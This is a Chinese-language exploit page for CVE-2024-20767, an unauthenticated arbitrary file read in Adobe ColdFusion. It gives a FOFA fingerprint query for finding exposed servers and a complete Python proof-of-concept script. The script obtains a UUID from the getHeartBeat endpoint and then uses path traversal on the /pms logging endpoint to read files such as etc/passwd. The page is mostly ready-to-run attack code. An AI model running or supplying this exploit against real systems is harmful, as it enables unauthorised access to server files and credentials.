## Adobe-ColdFusion任意文件读取漏洞CVE-2024-20767

Adobe ColdFusion 由于在鉴权方面存在疏漏，导致了可未授权访问，从而通过pms接口进行任意文件读取。

## fofa
```
app="Adobe-ColdFusion"
```

## poc
```python
import requests
import re
import urllib3
import argparse

urllib3.disable_warnings()

parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target",required=True, help="Target Adobe ColdFusion Server URL")
parser.add_argument("-p", "--port",required=False, default=8500, help="Target Adobe ColdFusion Server Port, by default we use the 8500 Port")
parser.add_argument("-c", "--command", required=True,help="File to read path") # Example in Windows Server 'Windows/ServerStandardEval.xml' or Linux Server "etc/passwd"
args = parser.parse_args()

def get_uuid():
    endpoint = "/CFIDE/adminapi/_servermanager/servermanager.cfc?method=getHeartBeat" # Vulnerable endpoint to get the UUID
    session = requests.Session()
    try:
        response = session.get(args.target+":"+str(args.port)+endpoint, verify=False)
        print("[+] Connecting to ColdFusion Server...")
        repattern = r"<var name='uuid'><string>(.+?)</string></var>" # Regex expression to get UUID
        uuid = re.findall(repattern, response.text)[0]
        print("[+] UUID Obtained: ", uuid)
        return uuid
    except:
        print("[-] Error connecting to server")

def exploit(uuid):
    headers = {
        "uuid": uuid
    }
    session = requests.Session()
    endpoint2 = "/pms?module=logging&file_name=../../../../../../../"+args.command+"&number_of_lines=100" # Vulnerable endpoint to read files
    response = session.get(args.target+":"+str(args.port)+endpoint2, verify=False, headers=headers)
    if response.status_code == 200 and int(response.headers["Content-Length"]) > 2:
        print("[+] Succesfully read file!")
        print(response.text)
    else:
        print("[-] Something went wrong while reading file or the file doesn't exist")

if __name__ == "__main__":
    exploit(get_uuid())
```

## 漏洞分析
- https://jeva.cc/2973.html
